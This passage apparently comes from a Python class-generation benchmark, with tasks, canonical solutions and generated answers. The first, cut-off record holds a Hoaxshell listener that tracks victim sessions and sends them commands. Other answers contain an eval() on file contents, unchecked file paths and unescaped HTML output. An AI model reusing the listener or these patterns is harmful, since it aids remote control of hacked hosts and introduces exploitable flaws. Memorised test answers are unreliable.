    "Canonical_solution": "```python\nfrom http.server import HTTPServer, BaseHTTPRequestHandler\nimport ssl\n\nclass Hoaxshell(BaseHTTPRequestHandler):\n    server_name = 'Hoaxshell Multi-Handler'\n    header_id = None\n    server_unique_id = None\n    command_pool = {}\n\n    def do_GET(self):\n        timestamp = int(datetime.now().timestamp())\n        \n        if not self.header_id:\n            header_id_extract = [header.replace(\"X-\", \"\") for header in self.headers.keys() if re.match(\"X-[a-z0-9]{4}-[a-z0-9]{4}\", header)]\n            self.header_id = f'X-{header_id_extract[0]}'\n\n        try:\n            session_id = self.headers.get(self.header_id)\n        except:\n            session_id = None\n\n        if session_id and (session_id not in Sessions_Manager.active_sessions.keys()):\n            if session_id in Sessions_Manager.legit_session_ids.keys():\n                h = session_id.split('-')\n                Sessions_Manager.verify.append(h[0])\n                Sessions_Manager.get_cmd.append(h[1])\n                Sessions_Manager.post_res.append(h[2])\n\n                Sessions_Manager.active_sessions[session_id] = {\n                    'IP Address': self.client_address[0],\n                    'Port': self.client_address[1],\n                    'execution_verified': False,\n                    'Status': 'Active',\n                    'last_received': timestamp,\n                    'OS Type': Sessions_Manager.legit_session_ids[session_id]['OS Type'],\n                    'frequency': Sessions_Manager.legit_session_ids[session_id]['frequency'],\n                    'Owner': self.server_unique_id,\n                    'self_owned': True,\n                    'aliased': False,\n                    'alias': None,\n                    'Listener': 'hoaxshell',\n                    'Shell': Sessions_Manager.legit_session_ids[session_id]['Shell'],\n                    'iface': Sessions_Manager.legit_session_ids[session_id]['iface'],\n                    'prompt': None,\n                    'Stability': 'Unstable'\n                }\n                self.command_pool[session_id] = []\n\n        elif session_id and (session_id in Sessions_Manager.active_sessions.keys()):\n            Sessions_Manager.active_sessions[session_id]['last_received'] = timestamp\n\n        self.server_version = Hoaxshell_Settings.server_version\n        self.sys_version = \"\"\n        session_id = self.headers.get(self.header_id)\n        legit = True if session_id in Sessions_Manager.legit_session_ids.keys() else False\n\n        url_split = self.path.strip(\"/\").split(\"/\")\n\n        if (url_split[0] in Sessions_Manager.verify and legit) or \\\n           (legit and session_id in Sessions_Manager.active_sessions and not Sessions_Manager.active_sessions[session_id]['execution_verified']):\n            \n            if Sessions_Manager.active_sessions[session_id]['execution_verified']:\n                print_to_prompt(f'\\r[{INFO}] Received \"Verify execution\" request from an already established session (ignored).')\n                return\n\n            self.send_response(200)\n            self.send_header('Content-type', 'text/javascript; charset=UTF-8')\n            self.send_header('Access-Control-Allow-Origin', '*')\n            self.end_headers()\n            self.wfile.write(bytes('OK', \"utf-8\"))\n            Sessions_Manager.active_sessions[session_id]['execution_verified'] = True\n\n            try:\n                Sessions_Manager.active_sessions[session_id]['Computername'] = url_split[1]\n                Sessions_Manager.active_sessions[session_id]['Username'] = url_split[2]\n                print_to_prompt(f'\\r[{GREEN}Shell{END}] {session_id} - New session established -> {ORANGE}{self.client_address[0]}{END} at {get_datetime()}.')\n\n            except IndexError:\n                Sessions_Manager.active_sessions[session_id]['Computername'] = 'Undefined'\n                Sessions_Manager.active_sessions[session_id]['Username'] = 'Undefined'\n                print_to_prompt(f'\\r[{GREEN}Shell{END}] {session_id} - New session established -> {ORANGE}{self.client_address[0]}{END} at {get_datetime()} (hostname and user undefined).')\n\n            try:\n                Thread(target=self.monitor_shell_state, args=(session_id,), name=f'session_state_monitor_{self.client_address[0]}', daemon=True).start()\n            except:\n                pass\n\n            new_session_data = deepcopy(Sessions_Manager.active_sessions[session_id])\n            new_session_data['session_id'] = session_id\n            new_session_data['alias'] = None\n            new_session_data['aliased'] = False\n            new_session_data['self_owned'] = False\n            Core_Server.announce_new_session(new_session_data)\n            del new_session_data\n\n        elif self.path.strip(\"/\") in Sessions_Manager.get_cmd and legit:\n            self.send_response(200)\n            self.send_header('Content-type', 'text/javascript; charset=UTF-8')\n            self.send_header('Access-Control-Allow-Origin', '*')\n            self.end_headers()\n\n            if len(self.command_pool[session_id]):\n                cmd = self.command_pool[session_id].pop(0)\n                if isinstance(cmd, dict):\n                    cmd = cmd['data']\n                self.wfile.write(bytes(cmd, 'utf-8'))\n            else:\n                self.wfile.write(bytes('None', 'utf-8'))\n\n            Sessions_Manager.active_sessions[session_id]['last_received'] = timestamp\n            return\n\n        else:\n            self.send_response(200)\n            self.end_headers()\n            self.wfile.write(b'')\n\n    def do_POST(self):\n        timestamp = int(datetime.now().timestamp())\n        session_id = self.headers.get(self.header_id)\n        legit = True if (session_id in Sessions_Manager.legit_session_ids.keys()) else False\n\n        if legit:\n            try:\n                Sessions_Manager.active_sessions[session_id]['last_received'] = timestamp\n                self.server_version = Hoaxshell_Settings.server_version\n                self.sys_version = \"\"\n\n                if self.path.strip(\"/\") in Sessions_Manager.post_res and legit and \\\n                   session_id in Sessions_Manager.active_sessions.keys():\n                    \n                    try:\n                        self.send_response(200)\n                        self.send_header('Content-Type', 'text/plain')\n                        self.end_headers()\n                        self.wfile.write(b'OK')\n                        content_len = int(self.headers.get('Content-Length'))\n                        output = None\n                        output = self.rfile.read(content_len)\n                        output = self.cmd_output_interpreter(session_id, output, constraint_mode=Sessions_Manager.legit_session_ids[session_id]['constraint_mode'])\n                        \n                        if not isinstance(output, int):\n                            if isinstance(output, str):\n                                if re.search(\"The term 'OK' is not recognized as the name of a cmdlet, function, script file\", output) or re.search('bash: line 1: OK: command not found', output):\n                                    return\n                                print(f'\\r{GREEN}{output}{END}') if output else do_nothing()\n                                print()\n                                Main_prompt.set_main_prompt_ready() if not self.active_shell else Hoaxshell.set_shell_prompt_ready()\n                            elif isinstance(output, list):\n                                if not isinstance(output[1], int):\n                                    try:\n                                        Core_Server.send_receive_one_encrypted(output[0], [f'{GREEN}{output[1]}{END}', '', session_id, True], 'command_output', 30)\n                                    except:\n                                        pass\n\n                    except ConnectionResetError:\n                        error_msg = f'[{ERR}] There was an error reading the response, most likely because of the size (Content-Length: {self.headers.get(\"Content-Length\")}). Try limiting the command\\'s output.'\n                        if isinstance(output, str):\n                            print(error_msg)\n                            Main_prompt.set_main_prompt_ready() if not self.active_shell else Hoaxshell.set_shell_prompt_ready()\n                        elif isinstance(output, list):\n                            try: Core_Server.send_receive_one_encrypted(output[0], [error_msg, '', session_id, True], 'command_output', 30)\n                            except: pass\n                        del error_msg\n\n                    finally:\n                        del output\n\n            except KeyError:\n                pass\n\n        else:\n            self.send_response(200)\n            self.end_headers()\n            self.wfile.write(b'Move on mate.')\n\n    def do_OPTIONS(self):\n        self.server_version = Hoaxshell_Settings.server_version\n        self.sys_version = \"\"\n        self.send_response(200)\n        self.send_header('Access-Control-Allow-Origin', self.headers[\"Origin\"])\n        self.send_header('Vary', \"Origin\")\n        self.send_header('Access-Control-Allow-Credentials', 'true')\n        self.send_header('Access-Control-Allow-Headers', Hoaxshell_Settings.header_id)\n        self.end_headers()\n        self.wfile.write(b'OK')\n\n    def log_message(self, format, *args):\n        return\n\ndef initiate_hoax_server():\n    try:\n        if (Hoaxshell_Settings.certfile and not Hoaxshell_Settings.keyfile) or \\\n           (Hoaxshell_Settings.keyfile and not Hoaxshell_Settings.certfile):\n            exit(f'[{DEBUG}] SSL support seems to be misconfigured (missing key or cert file).')\n\n        port = Hoaxshell_Settings.bind_port if not Hoaxshell_Settings.ssl_support else Hoaxshell_Settings.bind_port_ssl\n\n        try:\n            httpd = HTTPServer((Hoaxshell_Settings.bind_address, port), Hoaxshell)\n        except OSError:\n            exit(f'[{DEBUG}] {Hoaxshell.server_name} failed to start. Port {port} seems to already be in use.\\n')\n        except:\n            exit(f'\\n[{DEBUG}] {Hoaxshell.server_name} failed to start (Unknown error occurred).\\n')\n\n        if Hoaxshell_Settings.ssl_support:\n            context = ssl.SSLContext(ssl.PROTOCOL_TLS)\n            context.load_cert_chain(certfile=Hoaxshell_Settings.certfile, keyfile=Hoaxshell_Settings.keyfile)\n            httpd.socket = context.wrap_socket(sock=httpd.socket, server_side=True)\n\n        Hoaxshell_server = Thread(target=httpd.serve_forever, args=(), name='hoaxshell_server')\n        Hoaxshell_server.daemon = True\n        Hoaxshell_server.start()\n        registered_services.append({\n            'service': Hoaxshell.server_name,\n            'socket': f'{ORANGE}{Hoaxshell_Settings.bind_address}{END}:{ORANGE}{port}{END}'\n        })\n        print(f'[{ORANGE}{Hoaxshell_Settings.bind_address}{END}:{ORANGE}{port}{END}]::{Hoaxshell.server_name}')\n\n    except KeyboardInterrupt:\n        Hoaxshell.terminate()\n```",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "right_result": "import socket\nimport ssl\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass Hoaxshell(BaseHTTPRequestHandler):\n    def __init__(self, request, client_address, server):\n        self.server_name = \"Hoaxshell\"\n        self.header_id = \"X-Hoaxshell-Session\"\n        self.server_unique_id = \"hoaxshell-server-1\"\n        self.command_pool = {}\n        super().__init__(request, client_address, server)\n\n    def do_GET(self):\n        if self.headers.get(self.header_id):\n            session_id = self.headers[self.header_id]\n            if session_id in self.server.command_pool:\n                self.send_response(200)\n                self.send_header('Content-type', 'text/plain')\n                self.end_headers()\n                self.wfile.write(self.server.command_pool[session_id].encode())\n            else:\n                self.send_error(404, \"Command not found\")\n        else:\n            self.send_error(401, \"Unauthorized\")\n\n    def do_POST(self):\n        content_length = int(self.headers['Content-Length'])\n        post_data = self.rfile.read(content_length)\n        session_id = self.headers.get(self.header_id)\n        if session_id and session_id in self.server.command_pool:\n            self.server.command_pool[session_id] = post_data.decode()\n            self.send_response(200)\n            self.send_header('Content-type', 'text/plain')\n            self.end_headers()\n        else:\n            self.send_error(401, \"Unauthorized\")\n\n    def do_OPTIONS(self):\n        self.send_response(200)\n        self.send_header('Access-Control-Allow-Origin', '*')\n        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')\n        self.send_header('Access-Control-Allow-Headers', self.header_id)\n        self.end_headers()\n\n    def log_message(self, format, *args):\n        return\n\n    @staticmethod\n    def initiate_hoax_server(port=80, use_ssl=False, certfile=None):\n        server_address = ('', port)\n        if use_ssl:\n            httpd = HTTPServer(server_address, Hoaxshell)\n            context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)\n            context.load_cert_chain(certfile=certfile)\n            httpd.socket = context.wrap_socket(httpd.socket, server_side=True)\n            print(f\"HTTPS server running on port {port}\")\n        else:\n            httpd = HTTPServer(server_address, Hoaxshell)\n            print(f\"HTTP server running on port {port}\")\n        try:\n            httpd.serve_forever()\n        except KeyboardInterrupt:\n            print(\"Server shutting down\")\n            httpd.shutdown()"
  },
  {
    "Task_id": 227,
    "Instruction": "Task Description: Create a Python class that implements an HTTP server to serve static files and render dynamic content from a profile file, with optional browser auto-launch functionality.\n\nClass Description: ProfileHTTPServer is a class that creates and manages an HTTP server to serve both static files from a 'web' directory and dynamically rendered content from profile data. It handles port selection, profile data reading, and optional browser launching.\n\nAttributes:\nprof_filename: str - The filename of the profile to be read and served\nstart_browser: bool - Flag indicating whether to automatically open a browser tab\nport: Optional[int] - The port number to use for the server (None for auto-selection)\ndata: Any - The profile data read from the file\n\nMethods:\n__init__(prof_filename: str, start_browser: bool = False, port: Optional[int] = None) -> None - Initializes the server with profile filename, browser flag, and optional port\n_read_profile() -> Any - Reads and returns profile data from the specified file\n_is_port_in_use(port: int) -> bool - Checks if a port is already in use\nstart() -> None - Starts the HTTP server on the selected port, optionally launching a browser\n\nStaticServer (nested class):\n__init__(data: Any, prof_filename: str, *args, **kwargs) -> None - Initializes the request handler with profile data and filename\ndo_GET() -> None - Handles GET requests, serving either static files or rendered HTML\n_render() -> str - Renders the HTML template with profile data and version information",
    "Canonical_solution": "import html\nimport json\nimport mimetypes\nimport socket\nimport threading\nimport webbrowser\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\nfrom pathlib import Path\nfrom typing import Optional\n\nclass StaticServer(BaseHTTPRequestHandler):\n    def __init__(self, data, prof_filename, *args, **kwargs):\n        self.data = data\n        self.prof_filename = prof_filename\n        super().__init__(*args, **kwargs)\n\n    def do_GET(self):\n        self.send_response(200)\n\n        if self.path == \"/\":\n            self.send_header(\"Content-type\", \"text/html\")\n            self.end_headers()\n            self.wfile.write(self._render().encode())\n        else:\n            this_dir = Path(__file__).resolve().parent\n            filepath = this_dir / \"web\" / self.path[1:]\n\n            mimetype, _ = mimetypes.guess_type(str(filepath))\n            assert mimetype is not None\n            self.send_header(\"Content-type\", mimetype)\n            self.end_headers()\n\n            with open(filepath, \"rb\") as fh:\n                content = fh.read()\n            self.wfile.write(content)\n\n    def _render(self):\n        this_dir = Path(__file__).resolve().parent\n        with open(this_dir / \"web\" / \"index.html\", encoding=\"utf-8\") as _file:\n            template = string.Template(_file.read())\n\n        return template.substitute(\n            data=html.escape(json.dumps(self.data).replace(\"</\", \"<\\\\/\")),\n            version=html.escape(__version__),\n            filename=html.escape(self.prof_filename.replace(\"</\", \"<\\\\/\")),\n        )\n\nclass ProfileHTTPServer:\n    def __init__(self, prof_filename: str, start_browser: bool = False, port: Optional[int] = None):\n        self.prof_filename = prof_filename\n        self.start_browser = start_browser\n        self.port = port\n        self.data = self._read_profile()\n\n    def _read_profile(self):\n        try:\n            return read_import_profile(self.prof_filename)\n        except (TunaError, StopIteration):\n            pass\n        return read_runtime_profile(self.prof_filename)\n\n    def _is_port_in_use(self, port: int) -> bool:\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            return s.connect_ex((\"localhost\", port)) == 0\n\n    def start(self):\n        if self.port is None:\n            self.port = 8000\n            while self._is_port_in_use(self.port):\n                self.port += 1\n\n        handler = lambda *args: StaticServer(self.data, self.prof_filename, *args)\n        httpd = HTTPServer((\"\", self.port), handler)\n\n        if self.start_browser:\n            address = f\"http://localhost:{self.port}\"\n            threading.Thread(target=lambda: webbrowser.open_new_tab(address)).start()\n\n        print(f\"Starting httpd on port {self.port}\")\n        httpd.serve_forever()",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "right_result": "class ProfileHTTPServer:\n    def __init__(self, prof_filename: str, start_browser: bool = False, port: Optional[int] = None) -> None:\n        self.prof_filename = prof_filename\n        self.start_browser = start_browser\n        self.port = port\n        self.data = self._read_profile()\n\n    def _read_profile(self) -> Any:\n        try:\n            with open(self.prof_filename, 'r') as f:\n                return eval(f.read())\n        except Exception as e:\n            print(f\"Error reading profile file: {e}\")\n            return {}\n\n    def _is_port_in_use(self, port: int) -> bool:\n        import socket\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            return s.connect_ex(('localhost', port)) != 0\n\n    def start(self) -> None:\n        from http.server import HTTPServer, BaseHTTPRequestHandler\n        import webbrowser\n        import os\n\n        class StaticServer(BaseHTTPRequestHandler):\n            def __init__(self, *args, **kwargs):\n                self.data = kwargs.get('data')\n                self.prof_filename = kwargs.get('prof_filename')\n                super().__init__(*args, **kwargs)\n\n            def do_GET(self):\n                path = self.path\n                if path.startswith('/static/'):\n                    filename = path[7:]\n                    try:\n                        with open(os.path.join('web', filename), 'rb') as f:\n                            content = f.read()\n                        self.send_response(200)\n                        self.send_header('Content-type', 'text/html')\n                        self.end_headers()\n                        self.wfile.write(content)\n                    except Exception as e:\n                        self.send_error(404, f\"File not found: {e}\")\n                else:\n                    self.send_response(200)\n                    self.send_header('Content-type', 'text/html')\n                    self.end_headers()\n                    self.wfile.write(self._render().encode('utf-8'))\n\n            def _render(self) -> str:\n                return f\"<html><body><h1>Profile Data</h1><pre>{str(self.data)}</pre></body></html>\"\n\n        if self.port is None:\n            for p in range(8000, 8100):\n                if not self._is_port_in_use(p):\n                    self.port = p\n                    break\n\n        server_address = ('', self.port)\n        httpd = HTTPServer(server_address, StaticServer)\n        httpd.data = self.data\n        httpd.prof_filename = self.prof_filename\n        httpd.serve_forever()\n\n        if self.start_browser:\n            webbrowser.open(f\"http://localhost:{self.port}\")"
  },
  {
    "Task_id": 23,
    "Instruction": "Task Description: Implement an HTTP connection pool class to manage and reuse HTTP connections efficiently, reducing the overhead of establishing new connections for each request.\n\nClass Description: HTTPConnectionPool is a connection pooling mechanism for HTTP clients that maintains a pool of connections to a specific host, allowing for connection reuse and efficient resource management.\n\nAttributes:\n- host: str - The target host for the connections\n- port: int | None - The target port (defaults to None for standard ports)\n- timeout: Timeout | float | None - Connection and read timeout settings\n- maxsize: int - Maximum number of connections in the pool (default 1)\n- block: bool - Whether to block when pool is full (default False)\n- headers: typing.Mapping[str, str] | None - Default headers for connections\n- retries: Retry | bool | int | None - Retry configuration for failed requests\n- proxy: Url | None - Proxy server configuration\n- proxy_headers: typing.Mapping[str, str] | None - Headers for proxy connections\n- pool: queue.LifoQueue - The connection pool storage\n- num_connections: int - Count of total connections created\n- num_requests: int - Count of total requests made\n- conn_kw: typing.Any - Additional connection parameters\n\nMethods:\n- __init__(host: str, port: int | None = None, timeout: Timeout | float | None = None, maxsize: int = 1, block: bool = False, headers: typing.Mapping[str, str] | None = None, retries: Retry | bool | int | None = None, _proxy: Url | None = None, _proxy_headers: typing.Mapping[str, str] | None = None, **conn_kw: typing.Any) -> None - Initializes the connection pool with given parameters\n- _new_conn() -> HTTPConnection - Creates and returns a new connection\n- _get_conn(timeout: float | None = None) -> HTTPConnection - Retrieves a connection from the pool or creates a new one\n- _put_conn(conn: HTTPConnection | None) -> None - Returns a connection to the pool\n- _make_request(conn: HTTPConnection, method: str, url: str, timeout: Timeout = None, body: typing.Any = None, headers: typing.Mapping[str, str] | None = None, **response_kw: typing.Any) -> BaseHTTPResponse - Makes an HTTP request using the given connection\n- urlopen(method: str, url: str, body: typing.Any = None, headers: typing.Mapping[str, str] | None = None, retries: Retry | bool | int | None = None, timeout: Timeout | float | None = None, **response_kw: typing.Any) -> BaseHTTPResponse - Main method to make HTTP requests with connection pooling and retry logic\n- close() -> None - Closes all connections in the pool\n- _close_pool_connections(pool: queue.LifoQueue[typing.Any]) -> None - Static method to close all connections in a given pool",
    "Canonical_solution": "from socket import timeout as SocketTimeout\nfrom types import TracebackType\nfrom typing import Literal, TypeVar, Union, overload\nimport typing\nimport queue\nimport weakref\nfrom .connection import HTTPConnection, HTTPSConnection\nfrom .exceptions import (\n    ClosedPoolError,\n    EmptyPoolError,\n    FullPoolError,\n    HostChangedError,\n    MaxRetryError,\n    NewConnectionError,\n    ProtocolError,\n    ReadTimeoutError,\n)\nfrom .response import BaseHTTPResponse\nfrom .util.connection import is_connection_dropped\nfrom .util.proxy import connection_requires_http_tunnel\nfrom .util.retry import Retry\nfrom .util.timeout import Timeout\nfrom .util.url import Url, parse_url\nfrom .util.util import to_str\n\n_SelfT = TypeVar(\"_SelfT\")\n\nclass HTTPConnectionPool:\n    scheme = \"http\"\n    ConnectionCls = HTTPConnection\n\n    def __init__(\n        self,\n        host: str,\n        port: int | None = None,\n        timeout: Timeout | float | None = None,\n        maxsize: int = 1,\n        block: bool = False,\n        headers: typing.Mapping[str, str] | None = None,\n        retries: Retry | bool | int | None = None,\n        _proxy: Url | None = None,\n        _proxy_headers: typing.Mapping[str, str] | None = None,\n        **conn_kw: typing.Any,\n    ):\n        self.host = host\n        self.port = port\n        self.timeout = Timeout.from_float(timeout) if not isinstance(timeout, Timeout) else timeout\n        self.retries = retries if retries is not None else Retry.DEFAULT\n        self.pool = queue.LifoQueue(maxsize)\n        self.block = block\n        self.proxy = _proxy\n        self.proxy_headers = _proxy_headers or {}\n        self.num_connections = 0\n        self.num_requests = 0\n        self.conn_kw = conn_kw\n\n        for _ in range(maxsize):\n            self.pool.put(None)\n\n        weakref.finalize(self, self._close_pool_connections, self.pool)\n\n    def _new_conn(self) -> HTTPConnection:\n        self.num_connections += 1\n        return self.ConnectionCls(\n            host=self.host,\n            port=self.port,\n            timeout=self.timeout.connect_timeout,\n            **self.conn_kw,\n        )\n\n    def _get_conn(self, timeout: float | None = None) -> HTTPConnection:\n        conn = None\n        try:\n            conn = self.pool.get(block=self.block, timeout=timeout)\n        except queue.Empty:\n            if self.block:\n                raise EmptyPoolError(self, \"Pool is empty and blocking mode is enabled.\")\n            pass\n\n        if conn and is_connection_dropped(conn):\n            conn.close()\n            conn = None\n\n        return conn or self._new_conn()\n\n    def _put_conn(self, conn: HTTPConnection | None) -> None:\n        try:\n            self.pool.put(conn, block=False)\n        except queue.Full:\n            if conn:\n                conn.close()\n\n    def _make_request(\n        self,\n        conn: HTTPConnection,\n        method: str,\n        url: str,\n        timeout: Timeout = None,\n        body: typing.Any = None,\n        headers: typing.Mapping[str, str] | None = None,\n        **response_kw: typing.Any,\n    ) -> BaseHTTPResponse:\n        try:\n            conn.request(method, url, body=body, headers=headers)\n            response = conn.getresponse()\n            response._pool = self\n            return response\n        except (SocketTimeout, BaseException) as e:\n            conn.close()\n            raise\n\n    def urlopen(\n        self,\n        method: str,\n        url: str,\n        body: typing.Any = None,\n        headers: typing.Mapping[str, str] | None = None,\n        retries: Retry | bool | int | None = None,\n        timeout: Timeout | float | None = None,\n        **response_kw: typing.Any,\n    ) -> BaseHTTPResponse:\n        if retries is None:\n            retries = self.retries\n        elif not isinstance(retries, Retry):\n            retries = Retry.from_int(retries)\n\n        conn = None\n        try:\n            conn = self._get_conn(timeout=timeout)\n            response = self._make_request(\n                conn,\n                method,\n                url,\n                timeout=timeout,\n                body=body,\n                headers=headers,\n                **response_kw,\n            )\n            return response\n        except (EmptyPoolError, MaxRetryError, HostChangedError) as e:\n            raise\n        except (ProtocolError, OSError) as e:\n            retries = retries.increment(method, url, error=e, _pool=self)\n            retries.sleep()\n            return self.urlopen(\n                method,\n                url,\n                body,\n                headers,\n                retries,\n                timeout,\n                **response_kw,\n            )\n        finally:\n            if conn:\n                self._put_conn(conn)\n\n    def close(self) -> None:\n        if self.pool:\n            self._close_pool_connections(self.pool)\n            self.pool = None\n\n    @staticmethod\n    def _close_pool_connections(pool: queue.LifoQueue[typing.Any]) -> None:\n        try:\n            while True:\n                conn = pool.get(block=False)\n                if conn:\n                    conn.close()\n        except queue.Empty:\n            pass",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "right_result": "import http.client\nimport queue\nfrom typing import Any, Mapping, Optional, Union, TypeVar, Generic, Type, Callable\nimport time\nfrom urllib.parse import urlparse\nfrom socket import timeout as SocketTimeout\nfrom http.client import HTTPConnection, HTTPSConnection\nfrom urllib3.util.retry import Retry\nfrom urllib3.util.url import parse_url\nfrom urllib3.util.timeout import Timeout\n\nT = TypeVar('T')\n\nclass HTTPConnectionPool:\n    def __init__(self, host: str, port: int | None = None, timeout: Union[Timeout, float, None] = None, maxsize: int = 1, block: bool = False, headers: Mapping[str, str] | None = None, retries: Union[Retry, bool, int, None] = None, _proxy: Union['urllib3.util.proxy.Url', None] = None, _proxy_headers: Mapping[str, str] | None = None, **conn_kw: Any) -> None:\n        self.host = host\n        self.port = port\n        self.timeout = timeout\n        self.maxsize = maxsize\n        self.block = block\n        self.headers = headers\n        self.retries = retries\n        self._proxy = _proxy\n        self._proxy_headers = _proxy_headers\n        self.conn_kw = conn_kw\n        self.pool = queue.LifoQueue(maxsize=maxsize)\n        self.num_connections = 0\n        self.num_requests = 0\n        self._setup_pool()\n\n    def _setup_pool(self):\n        for _ in range(self.maxsize):\n            self._put_conn(self._new_conn())\n\n    def _new_conn(self) -> http.client.HTTPConnection:\n        if self.port is not None:\n            connection_class = HTTPSConnection if self._is_https() else HTTPConnection\n            return connection_class(self.host, self.port, **self.conn_kw)\n        else:\n            connection_class = HTTPSConnection if self._is_https() else HTTPConnection\n            return connection_class(self.host, **self.conn_kw)\n\n    def _is_https(self) -> bool:\n        parsed_url = urlparse(self.host)\n        return parsed_url.scheme == 'https'\n\n    def _get_conn(self, timeout: Union[float, None] = None) -> http.client.HTTPConnection:\n        if timeout is None:\n            timeout = self.timeout\n        try:\n            conn = self.pool.get(block=self.block)\n            self.num_requests += 1\n            return conn\n        except queue.Empty:\n            return self._new_conn()\n\n    def _put_conn(self, conn: http.client.HTTPConnection | None) -> None:\n        if conn is not None:\n            self.pool.put(conn)\n            self.num_connections += 1\n\n    def _make_request(self, conn: http.client.HTTPConnection, method: str, url: str, timeout: Union[Timeout, float, None] = None, body: Any = None, headers: Mapping[str, str] | None = None, **response_kw: Any) -> Any:\n        if timeout is None:\n            timeout = self.timeout\n        if headers is None:\n            headers = {}\n        if self.headers is not None:\n            headers.update(self.headers)\n        if self._proxy is not None:\n            headers.update(self._proxy_headers or {})\n        try:\n            conn.request(method, url, body, headers)\n            response = conn.getresponse()\n            return response\n        except (SocketTimeout, ConnectionResetError, OSError) as e:\n            raise e\n\n    def urlopen(self, method: str, url: str, body: Any = None, headers: Mapping[str, str] | None = None, retries: Union[Retry, bool, int, None] = None, timeout: Union[Timeout, float, None] = None, **response_kw: Any) -> Any:\n        if retries is None:\n            retries = self.retries\n        if timeout is None:\n            timeout = self.timeout\n        if not retries:\n            retries = Retry(total=0)\n        for i in range(retries.total + 1):\n            try:\n                conn = self._get_conn(timeout)\n                response = self._make_request(conn, method, url, timeout, body, headers, **response_kw)\n                return response\n            except Exception as e:\n                if i < retries.total:\n                    time.sleep(retries.backoff_factor)\n                    continue\n                else:\n                    raise e\n        return None\n\n    def close(self) -> None:\n        self._close_pool_connections(self.pool)\n\n    @staticmethod\n    def _close_pool_connections(pool: queue.LifoQueue[Any]) -> None:\n        while not pool.empty():\n            conn = pool.get_nowait()\n            conn.close()"
  },
  {
    "Task_id": 232,
    "Instruction": "Task Description: Create a Python HTTP server that handles GET and POST requests, processes input sentences, and returns formatted responses.\n\nClass Description: The solution consists of two classes:\n1. `S` - A custom request handler that inherits from BaseHTTPRequestHandler\n2. `HTTPServerWrapper` - A server wrapper class that manages the HTTP server instance\n\nAttributes:\nport: int - The port number on which the server will run (default: 8765)\nserver_class: HTTPServer - The HTTP server class from http.server module\nhandler_class: S - The custom request handler class\n\nMethods:\nS._set_headers() -> None - Sets basic HTTP response headers\nS.write(text: str) -> None - Writes text to the response stream\nS.do_GET() -> None - Handles GET requests, processes sentence parameter, and returns HTML response\nS.do_HEAD() -> None - Handles HEAD requests\nS.do_POST() -> None - Handles POST requests with a simple response\nHTTPServerWrapper.run() -> None - Starts the HTTP server and begins serving requests indefinitely",
    "Canonical_solution": "from http.server import BaseHTTPRequestHandler, HTTPServer\nfrom urllib.parse import parse_qs, urlparse, quote\nimport random\nimport re\n\nclass S(BaseHTTPRequestHandler):\n    def _set_headers(self):\n        self.send_response(200)\n        self.send_header('Content-type', 'text/html')\n        self.end_headers()\n\n    def write(self, text: str):\n        self.wfile.write(text.encode())\n\n    def do_GET(self):\n        params = parse_qs(urlparse(self.path).query)\n        self._set_headers()\n        sentence = random.choice([\n            'HanLP\u662f\u9762\u5411\u751f\u4ea7\u73af\u5883\u7684\u81ea\u7136\u8bed\u8a00\u5904\u7406\u5de5\u5177\u5305\u3002',\n            '\u4e0a\u6d77\u534e\u5b89\u5de5\u4e1a\uff08\u96c6\u56e2\uff09\u516c\u53f8\u8463\u4e8b\u957f\u8c2d\u65ed\u5149\u548c\u79d8\u4e66\u5f20\u665a\u971e\u6765\u5230\u7f8e\u56fd\u7ebd\u7ea6\u73b0\u4ee3\u827a\u672f\u535a\u7269\u9986\u53c2\u89c2\u3002',\n            '\u5251\u6865\u5206\u6790\u516c\u53f8\u591a\u4f4d\u9ad8\u7ba1\u5bf9\u5367\u5e95\u8bb0\u8005\u8bf4\uff0c\u4ed6\u4eec\u786e\u4fdd\u4e86\u5510\u7eb3\u5fb7\u00b7\u7279\u6717\u666e\u5728\u603b\u7edf\u5927\u9009\u4e2d\u83b7\u80dc\u3002',\n            '\u6536\u4ef6\u4eba\u5728\u4e07\u535a\u00b7\u9f50\u90fd\u56fd\u9645\u7eff\u8335\u82b1\u56ed\uff08\u4e1c\u95e8\uff09A8\u680b\uff0c\u9760\u8fd1\u6cf0\u5c71\u62a4\u7406\u804c\u4e1a\u5b66\u9662\u3002',\n            '\u4ed6\u5728\u6d59\u6c5f\u91d1\u534e\u51fa\u751f\uff0c\u4ed6\u7684\u540d\u5b57\u53eb\u91d1\u534e\u3002',\n            '\u603b\u7edf\u666e\u4eac\u4e0e\u7279\u6717\u666e\u901a\u7535\u8bdd\u8ba8\u8bba\u7f8e\u56fd\u592a\u7a7a\u63a2\u7d22\u6280\u672f\u516c\u53f8\u3002'\n        ])\n        if 'sentence' in params:\n            s = params['sentence']\n            if len(s):\n                sentence = s[0].strip()\n        punctuation = re.compile('[\u3002\uff01\uff1f!?]')\n        sentence = sentence[:len(punctuation.split(sentence)[0]) + 1]\n        sentence = sentence.replace(' ', '')\n        MAX_LENGTH = 50\n        if len(sentence) > MAX_LENGTH:\n            sentence = '\u8bf7\u8f93\u5165{}\u5b57\u4ee5\u5185\u7684\u53e5\u5b50'.format(MAX_LENGTH)\n        self.write(f\"<html><body><h1>{sentence}</h1></body></html>\")\n\n    def do_HEAD(self):\n        self._set_headers()\n\n    def do_POST(self):\n        self._set_headers()\n        self.write(\"<html><body><h1>POST!</h1></body></html>\")\n\nclass HTTPServerWrapper:\n    def __init__(self, port=8765):\n        self.port = port\n        self.server_class = HTTPServer\n        self.handler_class = S\n\n    def run(self):\n        server_address = ('', self.port)\n        httpd = self.server_class(server_address, self.handler_class)\n        print(f'\u670d\u52a1\u5668\u5df2\u542f\u52a8 http://localhost:{self.port}')\n        httpd.serve_forever()",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
